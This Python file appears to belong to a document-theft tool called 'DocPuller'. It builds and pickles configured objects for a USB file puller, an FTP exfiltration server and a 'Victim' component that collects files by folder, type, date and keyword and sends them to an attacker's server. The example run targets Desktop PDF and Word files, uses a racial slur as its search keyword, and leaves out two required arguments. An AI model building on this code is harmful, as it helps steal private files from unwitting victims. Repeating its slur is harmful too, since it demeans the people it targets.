import datetime
import pickle

import dill as dill

from DocPullerScripts.DocPullerFTP.server import Server
from DocPullerScripts.DocPullerFTP.victim import Victim
from DocPullerScripts.DocPullerUsb.DocPullerPreformenc import DocPullerUSB


class FrozenObjectGeneartor:

    def __init__(self, is_usb, direcoties, file_type, date, keywords, server_ip, server_port):
        self.is_usb = is_usb
        self.direcoties = direcoties
        self.file_type = file_type
        self.date = date
        self.keywords = keywords
        self.server_ip = server_ip
        self.server_port = server_port

    def __create_docpuller_usb(self):
        obj = DocPullerUSB(self.direcoties, self.file_type, self.keywords, self.date)

        with open('DocPullerObjecets/frozen_DocPullerUSB.pkl', 'wb') as file:
            dill.dump(obj, file)

    def __create_docpuller_ftp_server(self):
        obj = Server(self.server_ip, self.server_port)

        with open('DocPullerObjecets/frozen_DocPullerFTPSever.pkl', 'wb') as file:
            dill.dump(obj, file)

    def __create_docpuller_ftp_victim(self):
        obj = Victim(self.server_ip, self.server_port, self.direcoties, self.file_type, self.keywords, self.date)

        with open('DocPullerObjecets/frozen_DocPullerFTPVictim.pkl', 'wb') as file:
            dill.dump(obj, file)

    def main(self):
        if self.is_usb:
            self.__create_docpuller_usb()
        else:
            self.__create_docpuller_ftp_server()
            self.__create_docpuller_ftp_victim()


if __name__ == '__main__':
    asdf = FrozenObjectGeneartor(True, ('Desktop',), ('.pdf', '.doc'),
                                 (datetime.date(2020, 1, 1), datetime.date(2023, 1, 1)), ('nigger',))
    asdf.main()
